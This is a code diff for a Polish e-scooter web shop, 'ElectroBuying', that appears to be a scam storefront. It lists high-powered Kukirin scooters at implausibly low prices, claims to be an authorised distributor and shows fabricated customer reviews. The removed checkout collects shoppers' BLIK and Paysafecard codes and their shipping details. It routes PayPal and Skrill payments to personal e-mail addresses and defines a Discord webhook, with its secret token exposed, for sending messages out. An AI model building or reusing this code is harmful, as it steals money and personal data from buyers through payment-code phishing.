-                <input type="text" id="daneKodPocztowy" placeholder="Kod pocztowy (np. 00-000)" required pattern="\d{2}-\d{3}" maxlength="6">
-                <input type="tel" id="daneTelefon" placeholder="Numer telefonu" required maxlength="9" pattern="\d{9}">
-                <input type="email" id="daneEmail" placeholder="E-mail" required>
-                <button type="submit">Zapisz dane</button>
-                <div class="dane-success" id="daneSuccess" style="display:none"></div>
-            </form>
-            <div class="pay-options" id="payOptions" style="display:none">
-                <button class="pay-btn" data-pay="blik">BLIK</button>
-                <button class="pay-btn" data-pay="paypal">PayPal</button>
-                <button class="pay-btn" data-pay="skrill">Skrill</button>
-                <button class="pay-btn" data-pay="crypto">Kryptowaluty</button>
-                <button class="pay-btn" data-pay="psc">PSC</button>
-            </div>
-            <form class="blik-form" id="blikForm" style="display:none">
-                <div style="color:#fff; margin-bottom:6px;">
-                    Wpisz kwotę i kod BLIK.
+
+    <!-- Checkout Modal (New) -->
+    <div class="checkout-modal" id="checkout-modal">
+        <div class="checkout-modal-content">
+            <span class="close" onclick="closeCheckoutModal()">&times;</span>
+            <div id="checkout-steps">
+                <div id="shipping-step">
+                    <h3>Dane do wysyłki</h3>
+                    <form id="shipping-form">
+                        <div class="form-group">
+                            <label for="fullName">Imię i nazwisko *</label>
+                            <input type="text" id="fullName" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="email">Adres email *</label>
+                            <input type="email" id="email" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="phone">Numer telefonu *</label>
+                            <input type="tel" id="phone" pattern="[0-9]{9}" maxlength="9" inputmode="numeric" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="street">Ulica i numer domu *</label>
+                            <input type="text" id="street" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="zipCode">Kod pocztowy *</label>
+                            <input type="text" id="zipCode" pattern="[0-9]{2}-[0-9]{3}" maxlength="6" placeholder="00-000" inputmode="numeric" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="city">Miasto *</label>
+                            <input type="text" id="city" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="deliveryMethod">Sposób dostawy *</label>
+                            <select id="deliveryMethod" required>
+                                <option value="">Wybierz firmę kurierską</option>
+                                <option value="dhl">Kurier DHL - 19.99 zł</option>
+                                <option value="inpost">Kurier InPost - 18.99 zł</option>
+                                <option value="dpd">Kurier DPD - 20.99 zł</option>
+                                <option value="fedex">Kurier FedEx - 22.99 zł</option>
+                                <option value="ups">Kurier UPS - 21.99 zł</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label for="paymentMethod">Sposób płatności *</label>
+                            <select id="paymentMethod" required>
+                                <option value="">Wybierz sposób płatności</option>
+                                <option value="blik">BLIK</option>
+                                <option value="psc">Paysafecard (PSC)</option>
+                                <option value="card">Karta płatnicza</option>
+                            </select>
+                        </div>
+                        <button type="button" class="continue-btn" onclick="goToPaymentStep()">
+                            Przejdź do płatności
+                        </button>
+                    </form>
                 </div>
-                <input type="text" id="blikAmount" placeholder="Kwota (np. 300zł)" autocomplete="off" required>
-                <input type="text" id="blikCode" maxlength="6" pattern="[0-9]{6}" placeholder="Kod BLIK" autocomplete="off" required>
-                <button type="submit">Wyślij kod</button>
-                <div class="blik-success" id="blikSuccess" style="display:none"></div>
-                <div style="color:var(--secondary-neon); margin-top:8px;">Jeżeli kod BLIK nie zostanie przyjęty, proszę spróbować później.</div>
-            </form>
-            <form class="psc-form" id="pscForm" style="display:none">
-                <div style="color:#fff; margin-bottom:6px;">
-                    Wpisz 16-cyfrowy kod PSC.
+
+                <div id="payment-step" style="display: none;">
+                    <h3>Podsumowanie i płatność</h3>
+                    <div class="order-summary">
+                        <p>Produkty: <span id="summary-products-cost">0 zł</span></p>
+                        <p>Dostawa: <span id="summary-shipping-cost">0 zł</span></p>
+                        <p>Prowizja: <span id="summary-commission-cost">0.30 zł</span></p>
+                        <p class="total-final-price">Suma do zapłaty: <span id="summary-total-cost">0 zł</span></p>
+                    </div>
+                    <div id="payment-method-details">
+                        <!-- Dynamic content based on selected payment method -->
+                    </div>
+                    <button type="button" class="continue-btn" onclick="backToShippingStep()">
+                        &larr; Wróć do danych wysyłki
+                    </button>
                 </div>
-                <input type="text" id="pscCode" placeholder="xxxx-xxxx-xxxx-xxxx" autocomplete="off" required>
-                <button type="submit">Gotowe</button>
-                <div class="psc-success" id="pscSuccess" style="display:none"></div>
-            </form>
-            <div class="pay-info" id="payInfo" style="display:none"></div>
-            <div class="crypto-options" id="cryptoOptions" style="display:none">
-                <button class="crypto-btn" data-crypto="btc">Bitcoin</button>
-                <button class="crypto-btn" data-crypto="ltc">Litecoin</button>
-                <button class="crypto-btn" data-crypto="sol">Solana</button>
-                <button class="crypto-btn" data-crypto="eth">Ethereum</button>
             </div>
-            <div class="pay-final-msg" id="payFinalMsg" style="display:none"></div>
         </div>
     </div>
-    
-    <div class="modal-bg" id="productModalBg">
-        <div class="modal" id="productModal">
-            <button class="close-modal" id="closeProductModal" title="Zamknij">&times;</button>
-            <div class="product-modal-img-container">
-                <img class="product-modal-img" src="" alt="Zdjęcie produktu" id="productModalImg">
-            </div>
-            <div class="product-modal-details">
-                <h2 id="productModalName">Nazwa produktu</h2>
-                <p class="product-modal-price" id="productModalPrice">Cena: 0 zł</p>
-                <div class="product-modal-specs" id="productModalSpecs">
-                    <h4>Specyfikacje:</h4>
-                    <ul>
-                        <li>Brak danych.</li>
-                    </ul>
-                </div>
-                <button class="product-modal-add-btn" id="productModalAddBtn">Dodaj do koszyka</button>
-            </div>
-        </div>
+
+    <!-- Scroll to Top Button -->
+    <button id="scroll-to-top" title="Wróć na górę">⬆️</button>
+
+    <!-- Cart Notification -->
+    <div class="cart-notification" id="cart-notification">
+        <span>✅</span> <span id="notification-message"></span>
     </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 ElectroBuying. Autoryzowany dystrybutor hulajnóg Kukirin w Polsce. Wszystkie prawa zastrzeżone.</p>
+        </div>
+    </footer>
 
     <script>
-        // Produkty ze specyfikacjami
-        const products = [
-            { 
-                name: "Kukirn G2", 
-                price: 150, 
-                img: "https://www.geekbuying.pl/55635-large_default/skladana-hulajnoga-elektryczna-kukirin-g2-silnik-800w.webp",
-                specs: "Silnik: 800W, Prędkość maks: 45 km/h, Zasięg: 40-50 km, Bateria: 48V 15Ah, Opony: 10 cali, Hamulce: Podwójne tarczowe, Zawieszenie: Przednie i tylne amortyzatory."
-            },
-            { 
-                name: "Kukirn G2 Pro", 
-                price: 250, 
-                img: "https://tse1.mm.bing.net/th/id/OIP.oZB_RINVA4K_XcvPgHqMnAHaHl?r=0&pid=ImgDet&w=163&h=166&c=7&o=7&rm=3",
-                specs: "Silnik: 1000W, Prędkość maks: 55 km/h, Zasięg: 50-60 km, Bateria: 48V 15Ah, Opony: 10 cali, Hamulce: Podwójne tarczowe, Zawieszenie: Przednie i tylne amortyzatory." 
-            },
-            { 
-                name: "Kukirn G2 Master", 
-                price: 299, 
-                img: "https://th.bing.com/th/id/OIP.LgIL5gdSB-3c7hYb3qmfVQHaHa?w=169&h=180&c=7&r=0&o=5&pid=1.7",
-                specs: "Silnik: Podwójny 1000W (2000W), Prędkość maks: 60 km/h, Zasięg: do 70 km, Bateria: 52V 20Ah, Opony: 10 cali, Hamulce: Hydrauliczne tarczowe, Zawieszenie: Zaawansowane hydrauliczne." 
-            },
-            { 
-                name: "Kukirn G3", 
-                price: 250, 
-                img: "https://th.bing.com/th/id/OIP.ACuiHXmVwoMUf0O0_0k8dAHaHa?w=186&h=186&c=7&r=0&o=7&pid=1.7&rm=3",
-                specs: "Silnik: 1200W, Prędkość maks: 50 km/h, Zasięg: 70 km, Bateria: 52V 18Ah, Opony: 10 cali, Hamulce: Podwójne tarczowe, Zawieszenie: Przednie i tylne." 
-            },
-            { 
-                name: "Kukirn G3 Pro", 
-                price: 300, 
-                img: "https://th.bing.com/th/id/OIP.mGeEjEDAPgNo9gs1FoTbfQHaHa?w=188&h=189&c=7&r=0&o=7&pid=1.7&rm=3",
-                specs: "Silnik: Podwójny 1200W (2400W), Prędkość maks: 65-70 km/h, Zasięg: 80+ km, Bateria: 52V 23Ah, Opony: 10 cali, Hamulce: Hydrauliczne tarczowe, Zawieszenie: Pełne zaawansowane." 
-            },
-            { 
-                name: "Kukirn G4", 
-                price: 399, 
-                img: "https://th.bing.com/th/id/OIP.LgIL5gdSB-3c7hYb3qmfVQHaHa?w=169&h=180&c=7&r=0&o=5&pid=1.7",
-                specs: "Silnik: 2000W, Prędkość maks: 70 km/h, Zasięg: do 75 km, Bateria: 60V 20Ah, Opony: 11 cali, Hamulce: Podwójne hydrauliczne tarczowe, Zawieszenie: Podwójne amortyzatory." 
-            },
-            { 
-                name: "Kukirn G4 Max", 
-                price: 499, 
-                img: "https://th.bing.com/th/id/OIP.6-l4lvs6Ma1Ojlu2UZLOeAHaHq?w=176&h=182&c=7&r=0&o=7&pid=1.7&rm=3",
-                specs: "Silnik: Podwójny 2000W (4000W), Prędkość maks: 80+ km/h, Zasięg: 90+ km, Bateria: 60V 35Ah, Opony: 11 cali, Hamulce: Przednie i tylne hydrauliczne tarczowe, Zawieszenie: Heavy-duty full suspension." 
-            },
-            { 
-                name: "Kukirin G2 Max", 
-                price: 250, 
-                img: "https://th.bing.com/th/id/OIP.oWSGkA9D-jt2oHTlLYI4mgHaHa?w=170&h=180&c=7&r=0&o=7&pid=1.7&rm=3",
-                specs: "Silnik: 1000W, Prędkość maks: 55 km/h, Zasięg: 80 km, Bateria: 48V 20Ah, Opony: 10 cali, Hamulce: Podwójne tarczowe, Zawieszenie: Przednie i tylne amortyzatory." 
-            },
-            { 
-                name: "Kukirin M4 Max", 
-                price: 250, 
-                img: "https://img.joomcdn.net/69c1fd65707d9e59d23524597dd48b61a6207557_original.jpeg",
-                specs: "Silnik: 500W, Prędkość maks: 45 km/h, Zasięg: 50-60 km, Bateria: 48V 16Ah, Opony: 10 cali, Hamulce: Podwójne tarczowe, Zawieszenie: Przednie i tylne amortyzatory." 
-            }
-        ];
-
-        // Renderowanie produktów
-        const productsDiv = document.getElementById('products');
-        products.forEach((prod, idx) => {
-            const div = document.createElement('div');
-            div.className = 'product';
-            div.setAttribute('data-idx', idx); 
-            div.innerHTML = `
-                <div class="product-img-wrap">
-                    <img src="${prod.img}" alt="${prod.name}">
-                </div>
-                <h3>${prod.name}</h3>
-                <p>Cena: ${prod.price} zł</p>
-                <button class="add-to-cart-btn" data-idx="${idx}">Dodaj do koszyka</button>
-            `;
-            productsDiv.appendChild(div);
-        });
-
-        // Koszyk
-        let cart = [];
-        let cartTimeout = null;
-        let errorTimeout = null;
-        let totalCartPrice = 0;
-        
-        // Otwieranie modalu produktu
-        function openProductModal(prod) {
-            const productModalBg = document.getElementById('productModalBg');
-            const productModalImg = document.getElementById('productModalImg');
-            const productModalName = document.getElementById('productModalName');
-            const productModalPrice = document.getElementById('productModalPrice');
-            const productModalSpecs = document.getElementById('productModalSpecs');
-            const productModalAddBtn = document.getElementById('productModalAddBtn');
-            
-            productModalImg.src = prod.img;
-            productModalImg.alt = prod.name;
-            productModalName.textContent = prod.name;
-            productModalPrice.textContent = `Cena: ${prod.price} zł`;
-            
-            const specsList = prod.specs.split(', ').map(s => `<li>${s.trim()}</li>`).join('');
-            productModalSpecs.innerHTML = `<h4>Specyfikacje:</h4><ul>${specsList}</ul>`;
-
-            productModalAddBtn.setAttribute('data-idx', products.findIndex(p => p.name === prod.name));
-            productModalBg.classList.add('open');
-        }
-
-        // Zamykanie modalu produktu
-        function closeProductModal() {
-            document.getElementById('productModalBg').classList.remove('open');
-        }
-
-        // Dodawanie do koszyka
-        function addToCart(idx) {
-            const prod = products[idx];
-            const found = cart.find(item => item.name === prod.name);
-            if (found) {
-                found.qty += 1;
-            } else {
-                cart.push({ ...prod, qty: 1 });
-            }
-            updateCart();
-            openCart(true);
-        }
-
-        // Obsługa kliknięć na produkty i przyciski
-        productsDiv.addEventListener('click', function(e) {
-            const productElement = e.target.closest('.product');
-            if (productElement) {
-                const idx = parseInt(productElement.getAttribute('data-idx'));
-                if (e.target.classList.contains('add-to-cart-btn')) {
-                    e.stopPropagation();
-                    addToCart(idx);
-                } else {
-                    openProductModal(products[idx]);
-                }
-            }
-        });
-
-        // Obsługa przycisku "Dodaj do koszyka" w modal
-        document.getElementById('productModalAddBtn').addEventListener('click', function(e) {
-            const idx = parseInt(e.target.getAttribute('data-idx'));
-            addToCart(idx);
-            closeProductModal();
-        });
-
-        // Zamykanie modalu produktu
-        document.getElementById('closeProductModal').addEventListener('click', closeProductModal);
-        document.getElementById('productModalBg').addEventListener('mousedown', (e) => {
-            if (e.target.id === 'productModalBg') closeProductModal();
-        });
-
-        // Aktualizacja koszyka
-        function updateCart() {
-            const cartItemsDiv = document.getElementById('cartItems');
-            const cartCount = document.getElementById('cartCount');
-            const cartTotal = document.getElementById('cartTotal');
-            cartItemsDiv.innerHTML = '';
-            let total = 0;
-            let count = 0;
-            cart.forEach((item, i) => {
-                total += item.price * item.qty;
-                count += item.qty;
-                const itemDiv = document.createElement('div');
-                itemDiv.className = 'cart-item';
-                itemDiv.innerHTML = `
-                    <span>${item.name}</span>
-                    <button data-action="minus" data-idx="${i}">-</button>
-                    <span>${item.qty}</span>
-                    <button data-action="plus" data-idx="${i}">+</button>
-                    <span>${item.price * item.qty} zł</span>
-                `;
-                cartItemsDiv.appendChild(itemDiv);
-            });
-            totalCartPrice = total;
-            cartCount.textContent = count;
-            cartTotal.textContent = total > 0 ? `Suma: ${total} zł` : '';
-        }
-
-        // Obsługa przycisków + i -
-        document.getElementById('cartItems').addEventListener('click', function(e) {
-            if (e.target.tagName === 'BUTTON') {
-                const idx = parseInt(e.target.getAttribute('data-idx'));
-                const action = e.target.getAttribute('data-action');
-                if (action === 'plus') {
-                    cart[idx].qty += 1;
-                } else if (action === 'minus') {
-                    cart[idx].qty -= 1;
-                    if (cart[idx].qty <= 0) cart.splice(idx, 1);
-                }
-                updateCart();
-            }
-        });
-
-        // Otwieranie i zamykanie koszyka
-        const cartIcon = document.getElementById('cartIcon');
-        const cartModalBg = document.getElementById('cartModalBg');
-        const closeCart = document.getElementById('closeCart');
-        const cartError = document.getElementById('cartError');
-        const checkoutBtn = document.getElementById('checkoutBtn');
-
-        function openCart(autoClose = false) {
-            cartModalBg.classList.add('open');
-            if (cartTimeout) clearTimeout(cartTimeout);
-            if (autoClose) {
-                cartTimeout = setTimeout(() => {
-                    cartModalBg.classList.remove('open');
-                }, 2000);
-            }
-        }
-        function closeCartPanel() {
-            cartModalBg.classList.remove('open');
-            if (cartTimeout) clearTimeout(cartTimeout);
-        }
-
-        cartIcon.addEventListener('click', () => openCart(false));
-        closeCart.addEventListener('click', closeCartPanel);
-
-        document.addEventListener('mousedown', (e) => {
-            if (cartModalBg.classList.contains('open') && !document.getElementById('cart-panel').contains(e.target) && !cartIcon.contains(e.target)) {
-                closeCartPanel();
-            }
-        });
-
-        // MODAL PŁATNOŚCI
-        const payModalBg = document.getElementById('payModalBg');
-        const payModal = document.getElementById('payModal');
-        const closePayModal = document.getElementById('closePayModal');
-        const payModalTitle = document.getElementById('payModalTitle');
-        const daneForm = document.getElementById('daneForm');
-        const daneImieNazwisko = document.getElementById('daneImieNazwisko');
-        const daneAdres = document.getElementById('daneAdres');
-        const daneKodPocztowy = document.getElementById('daneKodPocztowy');
-        const daneMiejscowosc = document.getElementById('daneMiejscowosc');
-        const daneTelefon = document.getElementById('daneTelefon');
-        const daneEmail = document.getElementById('daneEmail');
-        const daneSuccess = document.getElementById('daneSuccess');
-        const payOptions = document.getElementById('payOptions');
-        const blikForm = document.getElementById('blikForm');
-        const blikAmount = document.getElementById('blikAmount');
-        const blikCode = document.getElementById('blikCode');
-        const blikSuccess = document.getElementById('blikSuccess');
-        const pscForm = document.getElementById('pscForm');
-        const pscCode = document.getElementById('pscCode');
-        const pscSuccess = document.getElementById('pscSuccess');
-        const payInfo = document.getElementById('payInfo');
-        const cryptoOptions = document.getElementById('cryptoOptions');
-        const payFinalMsg = document.getElementById('payFinalMsg');
-
-        let daneSaved = false;
-        let currentCrypto = null;
-
-        function openPayModal() {
-            payModalBg.classList.add('open');
-            payModalTitle.textContent = "Podaj dane do wysyłki";
-            daneForm.style.display = 'flex';
-            daneImieNazwisko.value = '';
-            daneAdres.value = '';
-            daneKodPocztowy.value = '';
-            daneMiejscowosc.value = '';
-            daneTelefon.value = '';
-            daneEmail.value = '';
-            daneSuccess.style.display = 'none';
-            payOptions.style.display = 'none';
-            blikForm.style.display = 'none';
-            pscForm.style.display = 'none';
-            payInfo.style.display = 'none';
-            cryptoOptions.style.display = 'none';
-            payFinalMsg.style.display = 'none';
-            blikSuccess.style.display = 'none';
-            pscSuccess.style.display = 'none';
-            daneSaved = false;
-            currentCrypto = null;
-        }
-        function closePayModalFunc() {
-            payModalBg.classList.remove('open');
-        }
-        closePayModal.addEventListener('click', closePayModalFunc);
-        payModalBg.addEventListener('mousedown', (e) => {
-            if (e.target === payModalBg) closePayModalFunc();
-        });
-
-        // Dane do wysyłki
-        daneForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            const tel = daneTelefon.value.trim();
-            if (!/^\d{9}$/.test(tel)) {
-                daneSuccess.style.display = 'block';
-                daneSuccess.style.color = '#e53935';
-                daneSuccess.textContent = 'Numer telefonu musi mieć 9 cyfr!';
-                setTimeout(() => { daneSuccess.style.display = 'none'; }, 1500);
-                return;
-            }
-            if (daneImieNazwisko.value.trim() && daneAdres.value.trim() && daneKodPocztowy.value.trim() && daneMiejscowosc.value.trim() && tel && daneEmail.value.trim()) {
-                daneSuccess.style.display = 'block';
-                daneSuccess.style.color = '#0f0';
-                daneSuccess.textContent = 'Dane zapisane!';
-                daneSaved = true;
-                setTimeout(() => {
-                    daneForm.style.display = 'none';
-                    payModalTitle.textContent = "Wybierz metodę płatności";
-                    payOptions.style.display = 'flex';
-                }, 800);
-            }
-        });
-        
-        // Zablokowanie cyfr i znaków specjalnych w imieniu i nazwisku
-        daneImieNazwisko.addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/[^A-Za-z\sąęłńóśźżĄĘŁŃÓŚŹŻ]/g, '');
-        });
-
-        // Automatyczne dodawanie myślnika w kodzie pocztowym i blokowanie liter
-        daneKodPocztowy.addEventListener('input', function(e) {
-            let value = e.target.value.replace(/[^0-9]/g, '');
-            if (value.length > 2) {
-                value = value.slice(0, 2) + '-' + value.slice(2);
-            }
-            e.target.value = value.slice(0, 6);
-        });
-
-        // Blokowanie liter i znaków specjalnych w numerze telefonu
-        daneTelefon.addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/[^0-9]/g, '');
-        });
-
-        // Metody płatności
-        payOptions.addEventListener('click', function(e) {
-            if (e.target.classList.contains('pay-btn')) {
-                payOptions.style.display = 'none';
-                payInfo.style.display = 'none';
-                blikForm.style.display = 'none';
-                pscForm.style.display = 'none';
-                cryptoOptions.style.display = 'none';
-                payFinalMsg.style.display = 'none';
-                blikSuccess.style.display = 'none';
-                pscSuccess.style.display = 'none';
-                currentCrypto = null;
-
-                if (e.target.getAttribute('data-pay') === 'blik') {
-                    blikForm.style.display = 'flex';
-                } else if (e.target.getAttribute('data-pay') === 'psc') {
-                    pscForm.style.display = 'flex';
-                } else if (e.target.getAttribute('data-pay') === 'paypal') {
-                    payInfo.style.display = 'block';
-                    payInfo.innerHTML = `
-                        <b>Wyślij cenę zamówienia na e-mail PayPal:</b><br>
-                        <span style="color:#fff">wiktor.ozog@wp.pl</span>
-                        <div style="color:var(--secondary-neon); margin-top:8px;">Prosimy o wysłanie potwierdzenia na e-mail: <b>kontakt@electrobuy.pl</b></div>
-                        <button id="paypalDoneBtn" style="margin-top:14px;background:var(--button-bg);color:var(--bg-color);border:none;border-radius:12px;padding:12px 24px;font-size:1.1rem;font-weight:700;cursor:pointer;box-shadow:0 2px 8px var(--shadow-light);font-family:'Electrolize',Arial,Helvetica,sans-serif;letter-spacing:1px;">Gotowe</button>
-                    `;
-                    setTimeout(() => {
-                        const btn = document.getElementById('paypalDoneBtn');
-                        if (btn) btn.onclick = function() {
-                            payInfo.innerHTML = '<span style="color:#0f0;font-weight:700;">Dziękujemy za zamówienie!</span>';
-                            setTimeout(closePayModalFunc, 1200);
-                            cart = [];
-                            updateCart();
-                            closeCartPanel();
-                        };
-                    }, 100);
-                } else if (e.target.getAttribute('data-pay') === 'skrill') {
-                    payInfo.style.display = 'block';
-                    payInfo.innerHTML = `
-                        <b>Wyślij cenę zamówienia na e-mail Skrill:</b><br>
-                        <span style="color:#fff">oskiolimp.pl@wp.pl</span>
-                        <div style="color:var(--secondary-neon); margin-top:8px;">Prosimy o wysłanie potwierdzenia na e-mail: <b>kontakt@electrobuy.pl</b></div>
-                        <button id="skrillDoneBtn" style="margin-top:14px;background:var(--button-bg);color:var(--bg-color);border:none;border-radius:12px;padding:12px 24px;font-size:1.1rem;font-weight:700;cursor:pointer;box-shadow:0 2px 8px var(--shadow-light);font-family:'Electrolize',Arial,Helvetica,sans-serif;letter-spacing:1px;">Gotowe</button>
-                    `;
-                    setTimeout(() => {
-                        const btn = document.getElementById('skrillDoneBtn');
-                        if (btn) btn.onclick = function() {
-                            payInfo.innerHTML = '<span style="color:#0f0;font-weight:700;">Dziękujemy za zamówienie!</span>';
-                            setTimeout(closePayModalFunc, 1200);
-                            cart = [];
-                            updateCart();
-                            closeCartPanel();
-                        };
-                    }, 100);
-                } else if (e.target.getAttribute('data-pay') === 'crypto') {
-                    cryptoOptions.style.display = 'flex';
-                }
-            }
-        });
-
-        // Webhook URL do Discorda
-        const webhookUrl = 'https://discord.com/api/webhooks/1407517056919928972/zwMBseYPP88wE7JqyIQ-qwsksWOfw_-z4hJXzzfLrcso29Aft2xKO6s0H6VvsKLSv7kZ';
-
-        // Funkcja do wysyłania wiadomości przez webhook
-        function sendWebhookMessage(message) {
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
+        // Product specifications data
+        const productSpecs = {
+            g2: {
+                name: "Kukirin G2",
+                price: 200,
+                displayPrice: "200 zł",
+                description: "Podstawowy model z potężnym silnikiem 800W, zasięgiem 55km i prędkością do 45 km/h. Świetny start z hulajnogami elektrycznymi.",
+                imageUrl: "https://img.fantaskycdn.com/e266cce5c25303c20bde9d7e5e38115a_750x.jpeg",
+                icon: "🛴",
+                specs: {
+                    "Silnik": "800W",
+                    "Bateria": "48V 15.6Ah (18650 Li-ion)",
+                    "Zasięg": "55 km",
+                    "Prędkość max": "45 km/h",
+                    "Opony": "10″",
+                    "Waga": "26 kg",
+                    "Udźwig": "120 kg",
+                    "Podjazd": "do 20°"
                 },
-                body: JSON.stringify({
-                    content: message,
-                }),
-            })
-            .then(response => {
-                if (!response.ok) {
-                    console.error('Błąd przy wysyłaniu wiadomości do webhooka:', response.status, response.statusText);
-                }
-            })
-            .catch(error => {
-                console.error('Błąd sieci:', error);
+                reviews: [
+                    { name: "Jan Kowalski", stars: 5, text: "Świetny model na początek! G2 to niezawodność w dobrej cenie." },
+                    { name: "Maria Nowak", stars: 5, text: "Zasięg zgodny z opisem, bardzo zadowolona z zakupu G2." },
+                    { name: "Adam Wiśniewski", stars: 4, text: "Dobra hulajnoga, ale mogłaby być trochę szybsza. Ogólnie polecam." }
+                ]
+            },
+            g2pro: {
+                name: "Kukirin G2 Pro",
+                price: 279,
+                displayPrice: "279 zł",
+                description: "Ulepszona wersja G2 z silnikiem 600W, zwiększonym zasięgiem do 58km. Doskonały balans ceny i wydajności.",
+                imageUrl: "https://storage.googleapis.com/catalog-pictures-carrefour-es/catalog/pictures/hd_510x_/8712962812257_1.jpg",
+                icon: "💨",
+                specs: {
+                    "Silnik": "600W nominalnie",
+                    "Bateria": "48V 15.6Ah (18650 Li-ion)",
+                    "Zasięg": "58 km",
+                    "Prędkość max": "45 km/h",
+                    "Opony": "9″",
+                    "Waga": "25 kg",
+                    "Udźwig": "120 kg",
+                    "Podjazd": "19°"
+                },
+                reviews: [
+                    { name: "Piotr Zieliński", stars: 5, text: "G2 Pro to idealna hulajnoga do miasta. Świetne osiągi!" },
+                    { name: "Anna Kowalczyk", stars: 5, text: "Bardzo dobry stosunek jakości do ceny. Polecam G2 Pro." },
+                    { name: "Krzysztof Dąbrowski", stars: 5, text: "Lekka i zwinna, idealna na codzienne dojazdy. Bateria trzyma długo." }
+                ]
+            },
+            g2master: {
+                name: "Kukirin G2 Master",
+                price: 300,
+                displayPrice: "300 zł",
+                description: "Podwójny silnik 2x1000W (2000W łącznie!) z zasięgiem 70km i prędkością 60 km/h. Dla prawdziwych miłośników mocy.",
+                imageUrl: "https://officialkukirin.com/cdn/shop/articles/G2_MASTER.png?v=1693628156",
+                icon: "🏆",
+                specs: {
+                    "Silnik": "2×1000W (łącznie 2000W)",
+                    "Bateria": "52V 20.8Ah",
+                    "Zasięg": "70 km",
+                    "Prędkość max": "60 km/h",
+                    "Opony": "10″",
+                    "Waga": "33 kg",
+                    "Udźwig": "120 kg",
+                    "Podjazd": "20°"
+                },
+                reviews: [
+                    { name: "Tomasz Nowicki", stars: 5, text: "Podwójny silnik robi robotę! G2 Master to prawdziwa moc." },
+                    { name: "Katarzyna Sikora", stars: 5, text: "Fantastyczne przyspieszenie i stabilność. G2 Master to top!" },
+                    { name: "Marek Wójcik", stars: 5, text: "Niesamowita hulajnoga, czuć moc pod nogami. Polecam każdemu, kto szuka wrażeń." }
+                ]
+            },
+            g3: {
+                name: "Kukirin G3",
+                price: 279,
+                displayPrice: "279 zł",
+                description: "Zaawansowany model z silnikiem 1200W, zasięgiem 70km i maksymalną prędkością 50 km/h. Wyższa klasa za przystępną cenę.",
+                imageUrl: "https://img.joomcdn.net/63cfefe1fe02d52220d0d067aa764a762efd1890_1024_1024.jpeg",
+                icon: "🛴",
+                specs: {
+                    "Silnik": "1200W",
+                    "Bateria": "52V 18Ah (18650 Li-ion)",
+                    "Zasięg": "70 km",
+                    "Prędkość max": "50 km/h",
+                    "Opony": "10″",
+                    "Waga": "25 kg",
+                    "Udźwig": "120 kg",
+                    "Podjazd": "30°"
+                },
+                reviews: [
+                    { name: "Michał Wójcik", stars: 5, text: "G3 to świetny model z mocnym silnikiem. Bardzo polecam!" },
+                    { name: "Agnieszka Mazur", stars: 5, text: "Zasięg 70km to prawda! G3 sprawdza się idealnie." },
+                    { name: "Paweł Kaczmarek", stars: 4, text: "Bardzo dobra hulajnoga, ale mogłaby mieć lepsze oświetlenie." }
+                ]
+            },
+            g3pro: {
+                name: "Kukirin G3 Pro",
+                price: 300,
+                displayPrice: "300 zł",
+                description: "Podwójny silnik 2x1200W, zasięg 80km i maksymalna prędkość 65 km/h. Najwyższa wydajność w ofercie G3.",
+                imageUrl: "https://img.joomcdn.net/8beb2f9e297a2bb71a9d2eda4336662ace09a565_original.jpeg",
+                icon: "💨",
+                specs: {
+                    "Silnik": "2×1200W",
+                    "Bateria": "52V 23.2–23.4Ah (18650 Li-ion, wyjmowana bateria)",
+                    "Zasięg": "80 km",
+                    "Prędkość max": "65 km/h",
+                    "Opony": "10″ lub 11″",
+                    "Waga": "45 kg",
+                    "Udźwig": "120 kg",
+                    "Podjazd": "35°"
+                },
+                reviews: [
+                    { name: "Łukasz Górski", stars: 5, text: "G3 Pro z podwójnym silnikiem to prawdziwy potwór!" },
+                    { name: "Natalia Krawczyk", stars: 5, text: "80km zasięgu i 65 km/h - G3 Pro to marzenie!" },
+                    { name: "Szymon Wesołowski", stars: 5, text: "Niesamowita moc i stabilność. Idealna na dłuższe trasy." }
+                ]
+            },
+            g4: {
+                name: "Kukirin G4",
+                price: 400,
+                displayPrice: "400 zł",
+                description: "Potężny silnik 2000W, zasięg 75km i prędkość maksymalna 70 km/h. Dla wymagających użytkowników szukających najwyższych osiągów.",
+                imageUrl: "https://kukirin-escooter.com/cdn/shop/files/G4newestversion_6.jpg?v=1715740801&width=3200",
+                icon: "🏆",
+                specs: {
+                    "Silnik": "2000W (pojedynczy silnik)",
+                    "Bateria": "60V 20Ah (18650 Li-ion)",
+                    "Zasięg": "75 km",
+                    "Prędkość max": "70 km/h",
+                    "Opony": "11″",
+                    "Waga": "37 kg",
+                    "Udźwig": "120 kg",
+                    "Podjazd": "30°"
+                },
+                reviews: [
+                    { name: "Paweł Zieliński", stars: 5, text: "G4 to absolutny top! 70 km/h to prawdziwa szybkość." },
+                    { name: "Karolina Nowak", stars: 5, text: "Stabilność na wysokiej prędkości - G4 nie ma sobie równych." },
+                    { name: "Daniel Kowal", stars: 5, text: "Hulajnoga dla prawdziwych entuzjastów. Warta swojej ceny." }
+                ]
+            },
+            g4max: {
+                name: "Kukirin G4 Max",
+                price: 479,
+                oldPrice: 700,
+                displayPrice: "479 zł",
+                description: "TOP MODEL! Podwójny silnik 2x1600W (3200W łącznie), zasięg 95km i maksymalna prędkość 86 km/h. Najwyższa klasa!",
+                imageUrl: "https://img.joomcdn.net/992059d847666959f0d4fcfb632802da6e8e692e_original.jpeg",
+                icon: "🚀",
+                specs: {
+                    "Silnik": "2×1600W (3200W łącznie)",
+                    "Bateria": "60V 35.2Ah (removable lithium battery)",
+                    "Zasięg": "95 km",
+                    "Prędkość max": "86 km/h",
+                    "Opony": "12″",
+                    "Waga": "64 kg",
+                    "Udźwig": "150 kg",
+                    "Podjazd": "38°"
+                },
+                reviews: [
+                    { name: "Marcin Kowalczyk", stars: 5, text: "G4 Max to absolutny król hulajnóg! 86 km/h to niewiarygodne!" },
+                    { name: "Weronika Sikora", stars: 5, text: "Najlepszy model jaki miałam. G4 Max to inwestycja na lata!" },
